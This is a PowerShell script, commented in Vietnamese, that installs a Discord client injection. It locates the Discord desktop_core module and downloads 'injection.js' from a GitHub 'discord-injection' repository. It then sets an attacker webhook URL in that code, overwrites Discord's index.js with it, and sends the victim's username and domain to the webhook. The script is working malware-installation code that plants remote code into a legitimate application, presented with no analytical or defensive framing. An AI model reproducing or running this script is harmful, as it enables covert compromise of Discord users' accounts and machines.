function loghook {
    param (
        [Parameter(Mandatory = $true, Position = 0)]
        [string]$Message
    )

    # Get the current username and domain
    $username = $env:USERNAME
    $domain = $env:USERDOMAIN

    # Prepend the username and domain to the message
    $messageWithUserDomain = "$username - $domain`n$Message"

    # Define the webhook URL
    $webhookUrl = "YOUR_WEBHOOK_HERE2"

    # Create the payload
    $payload = @{
        content = $messageWithUserDomain
    } | ConvertTo-Json

    # Send the POST request to the webhook
    try {
        $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload
        Write-Output "Message sent successfully."
    }
    catch {
        Write-Error "Failed to send message: $_"
    }
}



$url = "https://raw.githubusercontent.com/adasdasdsaf/discord-injection/main/injection.js"

# Đường dẫn cục bộ của Discord
$localAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
$discordPath = Join-Path $localAppData "Discord"

# Lấy đường dẫn phiên bản mới nhất của ứng dụng Discord
$appVersionPath = Get-ChildItem -Path $discordPath -Directory | Sort-Object -Property Name -Descending | Select-Object -First 1
if (-not $appVersionPath) {
    loghook "Khong tim thay phien ban Discord trong $discordPath"
    exit
}

# Lấy đường dẫn của discord_desktop_core
$corePath = Join-Path $appVersionPath.FullName "modules\discord_desktop_core-*\discord_desktop_core"
$coreVersionPath = Get-ChildItem -Path $corePath -Directory | Sort-Object -Property Name -Descending | Select-Object -First 1
if (-not $coreVersionPath) {
    loghook "Khong tim thay thu muc discord_desktop_core trong $appVersionPath"
    exit
}

# Đường dẫn đến tệp index.js
$indexPath = Join-Path $coreVersionPath.FullName "index.js"
if (-not (Test-Path $indexPath)) {
    loghook "Không tim thay tep index.js trong $coreVersionPath"
    exit
}

# Tải nội dung từ URL
try {
    $content = Invoke-WebRequest -Uri $url -UseBasicParsing
    $fileContent = $content.Content
} catch {
    loghook "Khong the tai noi dung tu $url"
    exit
}

# Thay thế %key% thành 123 trong nội dung
$newContent = $fileContent -replace 'YOUR_WEBHOOK_HERE', 'YOUR_WEBHOOK_HERE2'

# Ghi nội dung mới vào tệp index.js
try {
    Set-Content -Path $indexPath -Value $newContent -Force
    loghook "Injection done."
} catch {
    loghook "Injection khong thanh cong."
    exit
}
